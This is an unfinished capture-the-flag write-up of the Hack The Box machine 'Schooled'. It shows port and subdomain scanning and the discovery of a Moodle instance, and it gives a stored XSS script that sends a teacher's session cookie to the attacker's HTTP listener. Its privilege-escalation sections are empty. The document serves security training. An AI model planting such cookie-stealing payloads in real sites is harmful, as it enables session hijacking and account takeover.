# Introduction

[![](https://www.hackthebox.eu/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png)](https://app.hackthebox.eu/machines/335)

| Point | Description |
| :------:| :------: |
| Name | Schooled  |
| OS   | FreeBSD  |
| Difficulty Rating| Medium   |
| Release | 03 Apr 2021   |
| IP | 10.10.10.234   |
| Owned | 28 Apr 2021 |

# Short retelling

* Find subdomain
* Use XSS to steel teacher's cookie
* Privilege escalation from teatcher to administrator of site with CVE
* Upload PHP reverse shell
* Find credentional to connect to mysql databases
* Crack bcrypt hash
* Get user.txt
* Create custom FreeBSD package
* Install it to get RCE
* Get root.txt

# Enumeration

## Nmap

Let's start reconing machine "Schooled" 10.10.10.234 with Nmap

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# nmap -sV -p- -sC 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 01:39 EDT
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.28s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=4/29%Time=608A4A0B%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 927.00 seconds

```

After reconnig we get 3 ports: 22/TCP SSH, 80/TCP HTTP, 33060/tcp mysql.

Let's start exploring web site.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132255.png)

It's site of education programm. 

Finding some info about prospective users.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132333.png)

Also we see interesting page *schooled.htb/contact.html*. Trying to exploit CSRF, SSTI, SQL Inj. Every time we get 404 Error when trying to get a quote.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132433.png)

There isn't something interesting in the source code too.

## Gobuster

Let's try to find something interesting in direcories of web server.

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# gobuster dir -e -u http://Schooled.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,301,302
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Schooled.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     rar,tar,html,phtml,zip,js,php,txt,htm
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/04/30 00:49:43 Starting gobuster
===============================================================
http://Schooled.htb/about.html (Status: 200)
http://Schooled.htb/contact.html (Status: 200)
http://Schooled.htb/css (Status: 301)
http://Schooled.htb/fonts (Status: 301)
http://Schooled.htb/images (Status: 301)
http://Schooled.htb/index.html (Status: 200)
http://Schooled.htb/index.html (Status: 200)
http://Schooled.htb/js (Status: 301)
===============================================================
2021/04/30 01:07:38 Finished
===============================================================
```

And we get no result. There isn't any credentials in these direcories.

## ffuf

Let's try to find subdomains of web server.

```
┌──(root💀kali)-[/home/kali]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://schooled.htb/ -H "Host:FUZZ.schooled.htb" -fw 5338

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://schooled.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.schooled.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 5338
________________________________________________

moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
:: Progress: [114441/114441] :: Job [1/1] :: 144 req/sec :: Duration: [0:13:04] :: Errors: 0 ::
```

And we find out about the subdomain *moodle*. Add `moodle.schooled.htb` to /etc/hosts.

Let's see on this web page.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132628.png)

We see four available courses and form to log in.

# Explotation

> *Moodle* is used for blended learning, distance education, flipped classroom and other e-learning projects in schools, universities, workplaces and other sectors.
it is used to create private websites with online courses for educators and trainers to achieve learning goals.[10][11] Moodle allows for extending and tailoring learning environments using community-sourced plugins.

Let's create our account.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132822.png)

After register and login we can enroll to course Mathematics of teacher Manuel Phillips.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132928.png)

In the course we see two messages

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133008.png)

One of messages is interesting...

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133038.png)

Ok, I think we need to start searching some CVE for *moodle*.

* https://www.cybersecurity-help.cz/vdb/SB2020072004
* https://www.cybersecurity-help.cz/vulnerabilities/31682/

First link says us dbout XSS attacks (A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website.). 

Second link says that remote authenticated attacker with teacher permission can escalate privileges from teacher role into manager role.

Also i find [POC](https://www.youtube.com/watch?v=BkEInFI4oIU) for CVE-2020-14321 and [profile of github](https://github.com/HoangKien1020/CVE-2020-14321) with this payload.

We knows that teacher will check links of MoodleNet in student's profiles form the message *Reminder for joining students*.

We can steel cookie's teacher with XSS attack. There is the good [article](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md) about it.

Let's edit our profile and use this XSS.

```
<script>var i=new Image;i.src="http://10.10.14.73:8000/?"+document.cookie;</script>
```

Start local http server and waiting cookie.

```

```


# Privilege Escalation#1


# Privilege Escalation#2



# Result and Resources


